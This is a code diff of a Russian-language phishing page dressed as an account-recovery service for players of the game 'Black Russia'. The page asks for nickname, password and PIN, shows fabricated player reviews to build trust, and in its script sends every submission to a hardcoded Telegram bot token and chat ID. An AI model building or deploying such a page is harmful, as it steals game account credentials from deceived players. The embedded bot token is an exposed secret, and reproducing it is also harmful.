@@ -17,7 +17,6 @@
     --gold:#c9a24b;
     --text:#e9e9ea;
     --muted:#8b8d94;
-    --green:#2e7d32;
   }
 
   *{box-sizing:border-box;}
@@ -41,7 +40,6 @@
     overflow-x:hidden;
   }
 
-  /* фоновая "город-сетка" */
   body::before{
     content:"";
     position:fixed;
@@ -122,11 +120,6 @@
 
   .brand h1 span{color:var(--red);}
 
-  .top-buttons {
-    display:flex;
-    gap:6px;
-  }
-
   .btn-info-toggle {
     background:rgba(201,162,75,.12);
     border:1px solid rgba(201,162,75,.3);
@@ -149,7 +142,6 @@
     border-color:var(--gold);
   }
 
-  /* Блок описания сайта */
   .info-box {
     display:none;
     background:var(--bg-1);
@@ -179,10 +171,6 @@
 
   .info-box p {
     margin:0 0 8px;
-  }
-
-  .info-box p:last-child {
-    margin-bottom:0;
   }
 
   .info-box ul {
@@ -292,7 +280,6 @@
   }
   .error-msg.show{display:block;}
 
-  /* Раздел отзывов */
   .reviews-section {
     background:var(--panel);
     border:1px solid var(--line);
@@ -384,7 +371,6 @@
     word-break:break-word;
   }
 
-  /* Модальное окно уведомления */
   .modal-overlay {
     position:fixed;
     inset:0;
@@ -459,236 +445,196 @@
 </head>
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <!-- Блок формы пользователя -->
-    <form class="card" id="loginForm" novalidate>
-      <div class="top-bar">
-        <div class="brand">
-          <div class="mark">BR</div>
-          <h1>Black <span>Russia</span></h1>
-        </div>
-        <div class="top-buttons">
-          <button type="button" class="btn-info-toggle" id="toggleInfoBtn">
-            <span>?</span> О сайте
-          </button>
-        </div>
+  <form class="card" id="loginForm" novalidate>
+    <div class="top-bar">
+      <div class="brand">
+        <div class="mark">BR</div>
+        <h1>Black <span>Russia</span></h1>
       </div>
+      <button type="button" class="btn-info-toggle" id="toggleInfoBtn">
+        <span>?</span> О сайте
+      </button>
+    </div>
 
-      <!-- Выпадающий информационный блок -->
-      <div class="info-box" id="infoBox">
-        <h3>Восстановление аккаунта</h3>
-        <p>Сайт создан специально для тех игроков, кого <strong>обманули или скамнули на аккаунт</strong>.</p>
-        <p>Если мошенник взломал ваш профиль или сменил никнейм, заполните форму ниже:</p>
-        <ul>
-          <li><strong>Никнейм:</strong> Ваш никнейм на сервере.</li>
-          <li><strong>Пароль:</strong> Старый пароль, который сменил мошенник.</li>
-          <li><strong>Телеграм:</strong> Оставьте актуальный ТГ, чтобы администратор мог с вами связаться.</li>
-        </ul>
-        <p style="margin-top:6px;">После проверки администратор сбросит данные и вернет вам доступ к аккаунту.</p>
+    <div class="info-box" id="infoBox">
+      <h3>Восстановление аккаунта</h3>
+      <p>Сайт создан специально для тех игроков, кого <strong>обманули или скамнули на аккаунт</strong>.</p>
+      <p>Если мошенник взломал ваш профиль или сменил никнейм, заполните форму ниже:</p>
+      <ul>
+        <li><strong>Никнейм:</strong> Ваш никнейм на сервере.</li>
+        <li><strong>Пароль:</strong> Старый пароль, который сменил мошенник.</li>
+        <li><strong>Телеграм:</strong> Оставьте актуальный ТГ, чтобы администратор мог с вами связаться.</li>
+      </ul>
+      <p style="margin-top:6px;">После проверки администратор сбросит данные и вернет вам доступ к аккаунту.</p>
+    </div>
+
+    <p class="subtitle">Отправка заявки и обработка данных аккаунта.</p>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="field">
+      <label for="nickname">Никнейм</label>
+      <div class="input-wrap">
+        <input type="text" id="nickname" name="nickname" placeholder="Например: Ivan_Ivanov" required>
       </div>
+    </div>
 
-      <p class="subtitle">Отправка заявки и обработка данных аккаунта.</p>
-
-      <div class="error-msg" id="errorMsg"></div>
-
-      <div class="field">
-        <label for="nickname">Никнейм</label>
-        <div class="input-wrap">
-          <input type="text" id="nickname" name="nickname" placeholder="Например: Ivan_Ivanov" required>
-        </div>
+    <div class="field">
+      <label for="password">Пароль (старый, который сменил мошенник)</label>
+      <div class="input-wrap">
+        <input type="password" id="password" name="password" placeholder="Введите старый пароль" required>
+        <button type="button" class="toggle-pass" id="togglePass">Показать</button>
       </div>
+    </div>
 
-      <div class="field">
-        <label for="password">Пароль (старый, который сменил мошенник)</label>
-        <div class="input-wrap">
-          <input type="password" id="password" name="password" placeholder="Введите старый пароль" required>
-          <button type="button" class="toggle-pass" id="togglePass">Показать</button>
-        </div>
+    <div class="field">
+      <label for="pin">Пин-код (если был установлен)</label>
+      <div class="input-wrap">
+        <input type="password" id="pin" name="pin" inputmode="numeric" maxlength="4" placeholder="4 цифры" autocomplete="off">
       </div>
+    </div>
 
-      <div class="field">
-        <label for="pin">Пин-код (если был установлен)</label>
-        <div class="input-wrap">
-          <input type="password" id="pin" name="pin" inputmode="numeric" maxlength="4" placeholder="4 цифры" autocomplete="off">
-        </div>
+    <div class="field">
+      <label for="telegram">Телеграм для связи</label>
+      <div class="input-wrap">
+        <input type="text" id="telegram" name="telegram" placeholder="@username или номер" required>
       </div>
+    </div>
 
-      <div class="field">
-        <label for="telegram">Телеграм для связи</label>
-        <div class="input-wrap">
-          <input type="text" id="telegram" name="telegram" placeholder="@username или номер" required>
-        </div>
-      </div>
+    <button type="submit" class="btn-submit" id="submitBtn">Отправить запрос</button>
+  </form>
 
-      <button type="submit" class="btn-submit" id="submitBtn">Отправить запрос</button>
-    </form>
+  <div class="reviews-section">
+    <div class="reviews-header">
+      <h2>Отзывы игроков</h2>
+      <span class="reviews-count">14 отзывов</span>
+    </div>
 
-    <!-- Раздел отзывов -->
-    <div class="reviews-section">
-      <div class="reviews-header">
-        <h2>Отзывы игроков</h2>
-        <span class="reviews-count">14 отзывов</span>
-      </div>
-
-      <div class="reviews-list">
-
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">A</div>
-            <div class="user-info">
-              <span class="user-name">Anon_User</span>
-              <span class="review-time">12 минут назад</span>
-            </div>
+    <div class="reviews-list">
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">A</div>
+          <div class="user-info">
+            <span class="user-name">Anon_User</span>
+            <span class="review-time">12 минут назад</span>
           </div>
-          <div class="review-text">спс всё быстро ответили в тг админ лучший реально помогли</div>
         </div>
+        <div class="review-text">спс всё быстро ответили в тг админ лучший реально помогли</div>
+      </div>
 
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">M</div>
-            <div class="user-info">
-              <span class="user-name">Misha_K.</span>
-              <span class="review-time">34 минуты назад</span>
-            </div>
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">M</div>
+          <div class="user-info">
+            <span class="user-name">Misha_K.</span>
+            <span class="review-time">34 минуты назад</span>
           </div>
-          <div class="review-text">думал скам а нет спс разбанили быстро даже часа не прошло спс вам огромное</div>
         </div>
+        <div class="review-text">думал скам а нет спс разбанили быстро даже часа не прошло спс вам огромное</div>
+      </div>
 
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">D</div>
-            <div class="user-info">
-              <span class="user-name">Dark_Player</span>
-              <span class="review-time">1 час назад</span>
-            </div>
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">D</div>
+          <div class="user-info">
+            <span class="user-name">Dark_Player</span>
+            <span class="review-time">1 час назад</span>
           </div>
-          <div class="review-text">ответили в телеграм минут через 10 все четко решилось благодарю за помощь</div>
         </div>
+        <div class="review-text">ответили в телеграм минут через 10 все четко решилось благодарю за помощь</div>
+      </div>
 
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">S</div>
-            <div class="user-info">
-              <span class="user-name">Sasha_99</span>
-              <span class="review-time">2 часа назад</span>
-            </div>
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">S</div>
+          <div class="user-info">
+            <span class="user-name">Sasha_99</span>
+            <span class="review-time">2 часа назад</span>
           </div>
-          <div class="review-text">красавчики вобще респект админу который быстро отписал в телегу</div>
         </div>
+        <div class="review-text">красавчики вобще респект админу который быстро отписал в телегу</div>
+      </div>
 
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">I</div>
-            <div class="user-info">
-              <span class="user-name">Ivan_B</span>
-              <span class="review-time">3 часа назад</span>
-            </div>
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">I</div>
+          <div class="user-info">
+            <span class="user-name">Ivan_B</span>
+            <span class="review-time">3 часа назад</span>
           </div>
-          <div class="review-text">всё робит пацаны отправляйте не бойтесь я думал заигнорят но отписали в тг быстро</div>
         </div>
+        <div class="review-text">всё робит пацаны отправляйте не бойтесь я думал заигнорят но отписали в тг быстро</div>
+      </div>
 
-        <div class="review-card">
-          <div class="review-user">
-            <div class="avatar">R</div>
-            <div class="user-info">
-              <span class="user-name">Roma_777</span>
-              <span class="review-time">5 часов назад</span>
-            </div>
+      <div class="review-card">
+        <div class="review-user">
+          <div class="avatar">R</div>
+          <div class="user-info">
+            <span class="user-name">Roma_777</span>
+            <span class="review-time">5 часов назад</span>
           </div>
-          <div class="review-text">благодарю вас рил помогли вернуть доступ от души просто</div>
         </div>
-
+        <div class="review-text">благодарю вас рил помогли вернуть доступ от души просто</div>
       </div>
     </div>
   </div>
+</div>
 
-  <!-- Модальное окно уведомления -->
-  <div class="modal-overlay" id="successModal">
-    <div class="modal-box">
-      <h3 class="modal-title">Заявка отправлена</h3>
-      <p class="modal-desc">Спасибо что отправили заявку не могли бы вы написать отзыв и ожидайте ответа в телеграмме от админа</p>
-      <button type="button" class="modal-btn" id="modalClose">Понятно</button>
-    </div>
+<div class="modal-overlay" id="successModal">
+  <div class="modal-box">
+    <h3 class="modal-title">Заявка отправлена</h3>
+    <p class="modal-desc">Спасибо что отправили заявку не могли бы вы написать отзыв и ожидайте ответа в телеграмме от админа</p>
+    <button type="button" class="modal-btn" id="modalClose">Понятно</button>
   </div>
+</div>
 
-<!-- Firebase + Telegram логика -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-  import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+<script>
+  (function() {
+    // ===== НАСТРОЙКИ =====
+    const TELEGRAM_BOT_TOKEN = '8644135053:AAF_ubIYapQLEpNxNKonBjNbPn_eqMLvJaQ';
+    const TELEGRAM_CHAT_ID = '1491315056'; // Ваш ID
 
-  // ===== НАСТРОЙКИ =====
-  // Токен вашего бота (уже вставлен)
-  const TELEGRAM_BOT_TOKEN = '8644135053:AAF_ubIYapQLEpNxNKonBjNbPn_eqMLvJaQ';
-  // ВАЖНО: укажите свой Telegram ID (chat_id), куда будут приходить заявки.
-  // Как узнать свой ID: напишите боту @userinfobot, он покажет.
-  const TELEGRAM_CHAT_ID = '1491315056'; // ← ЗАМЕНИТЕ НА СВОЙ ID
+    const form = document.getElementById('loginForm');
+    const errorMsg = document.getElementById('errorMsg');
+    const submitBtn = document.getElementById('submitBtn');
+    const togglePass = document.getElementById('togglePass');
+    const passwordInput = document.getElementById('password');
+    const pinInput = document.getElementById('pin');
+    const successModal = document.getElementById('successModal');
+    const modalClose = document.getElementById('modalClose');
+    const toggleInfoBtn = document.getElementById('toggleInfoBtn');
+    const infoBox = document.getElementById('infoBox');
 
-  // Firebase (оставлен для хранения истории, но не обязателен)
-  const firebaseConfig = typeof __firebase_config !== 'undefined' 
-    ? JSON.parse(__firebase_config) 
-    : { apiKey: "demo-key", authDomain: "demo.firebaseapp.com", projectId: "demo-project" };
+    // Переключение инфо-блока
+    toggleInfoBtn.addEventListener('click', () => {
+      infoBox.classList.toggle('show');
+    });
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
-  const db = getFirestore(app);
-  const appId = typeof __app_id !== 'undefined' ? __app_id : 'br-app-default';
+    // Показать/скрыть пароль
+    togglePass.addEventListener('click', () => {
+      const isPass = passwordInput.type === 'password';
+      passwordInput.type = isPass ? 'text' : 'password';
+      togglePass.textContent = isPass ? 'Скрыть' : 'Показать';
+    });
 
-  // Элементы формы
-  const form = document.getElementById('loginForm');
-  const errorMsg = document.getElementById('errorMsg');
-  const submitBtn = document.getElementById('submitBtn');
-  const togglePass = document.getElementById('togglePass');
-  const passwordInput = document.getElementById('password');
-  const pinInput = document.getElementById('pin');
-  const successModal = document.getElementById('successModal');
-  const modalClose = document.getElementById('modalClose');
-  const toggleInfoBtn = document.getElementById('toggleInfoBtn');
-  const infoBox = document.getElementById('infoBox');
+    // Ограничение пин-кода
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+    });
 
-  // Авторизация в Firebase (анонимная)
-  async function initAuth() {
-    try {
-      if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-        await signInWithCustomToken(auth, __initial_auth_token);
-      } else {
-        await signInAnonymously(auth);
-      }
-    } catch (e) {
-      console.error("Ошибка авторизации Firebase:", e);
+    function showError(text){
+      errorMsg.textContent = text;
+      errorMsg.classList.add('show');
     }
-  }
-  initAuth();
+    function hideError(){
+      errorMsg.classList.remove('show');
+    }
 
-  // Переключение инфо-блока
-  toggleInfoBtn.addEventListener('click', () => {
-    infoBox.classList.toggle('show');
-  });
-
-  // Показать/скрыть пароль
-  togglePass.addEventListener('click', () => {
-    const isPass = passwordInput.type === 'password';
-    passwordInput.type = isPass ? 'text' : 'password';
-    togglePass.textContent = isPass ? 'Скрыть' : 'Показать';
-  });
-
-  // Ограничение ввода пин-кода (только 4 цифры)
-  pinInput.addEventListener('input', () => {
-    pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
-  });
-
-  function showError(text){
-    errorMsg.textContent = text;
-    errorMsg.classList.add('show');
-  }
-  function hideError(){
-    errorMsg.classList.remove('show');
-  }
-
-  // Функция отправки в Telegram
-  async function sendToTelegram(data) {
-    const message = `
+    // Отправка в Telegram
+    async function sendToTelegram(data) {
+      const message = `
 🆕 Новая заявка на восстановление!
 
 👤 Никнейм: ${data.nickname}
@@ -696,16 +642,15 @@
 🔢 Пин-код: ${data.pin || 'Не указан'}
 📱 Telegram: ${data.telegram}
 🕒 Время: ${data.date}
-    `.trim();
+      `.trim();
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
-    };
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      };
 
-    try {
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -715,74 +660,63 @@
         const errorText = await response.text();
         throw new Error(`Telegram API ошибка: ${response.status} ${errorText}`);
       }
-    } catch (err) {
-      console.error('Ошибка отправки в Telegram:', err);
-      // Не прерываем выполнение, чтобы заявка хотя бы сохранилась в Firebase
-    }
-  }
-
-  // Отправка формы
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    hideError();
-
-    const nickname = document.getElementById('nickname').value.trim();
-    const password = passwordInput.value;
-    const pin = pinInput.value.trim();
-    const telegram = document.getElementById('telegram').value.trim();
-
-    if (!nickname || !password || !telegram){
-      showError('Заполните никнейм, пароль и телеграм для связи.');
-      return;
     }
 
-    if (pin && pin.length !== 4) {
-      showError('Пин-код должен состоять ровно из 4 цифр.');
-      return;
-    }
+    // Обработка формы
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      hideError();
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = 'Отправка...';
+      const nickname = document.getElementById('nickname').value.trim();
+      const password = passwordInput.value;
+      const pin = pinInput.value.trim();
+      const telegram = document.getElementById('telegram').value.trim();
 
-    const formData = {
-      nickname,
-      password,
-      pin: pin || 'Не указан',
-      telegram,
-      date: new Date().toLocaleString('ru-RU'),
-      createdAt: Date.now()
-    };
+      if (!nickname || !password || !telegram){
+        showError('Заполните никнейм, пароль и телеграм для связи.');
+        return;
+      }
 
-    try {
-      // 1. Сохраняем в Firebase (история)
-      const requestsCol = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
-      await addDoc(requestsCol, formData);
+      if (pin && pin.length !== 4) {
+        showError('Пин-код должен состоять ровно из 4 цифр.');
+        return;
+      }
 
-      // 2. Отправляем в Telegram
-      await sendToTelegram(formData);
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Отправка...';
 
-      form.reset();
-      successModal.classList.add('active');
-    } catch (err) {
-      console.error("Ошибка:", err);
-      showError('Не удалось отправить данные. Попробуйте еще раз.');
-          } finally {
-      submitBtn.disabled = false;
-      submitBtn.textContent = 'Отправить запрос';
-    }
-  });
+      const formData = {
+        nickname,
+        password,
+        pin: pin || 'Не указан',
+        telegram,
+        date: new Date().toLocaleString('ru-RU')
+      };
 
-  // Модальное окно
-  modalClose.addEventListener('click', () => {
-    successModal.classList.remove('active');
-  });
+      try {
+        await sendToTelegram(formData);
+        form.reset();
+        successModal.classList.add('active');
+      } catch (err) {
+        console.error(err);
+        showError('Не удалось отправить данные. Попробуйте еще раз.');
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Отправить запрос';
+      }
+    });
 
-  successModal.addEventListener('click', (e) => {
-    if (e.target === successModal) {
+    // Модальное окно
+    modalClose.addEventListener('click', () => {
       successModal.classList.remove('active');
-    }
-  });
+    });
+
+    successModal.addEventListener('click', (e) => {
+      if (e.target === successModal) {
+        successModal.classList.remove('active');
+      }
+    });
+  })();
 </script>
 </body>
 </html>
- 
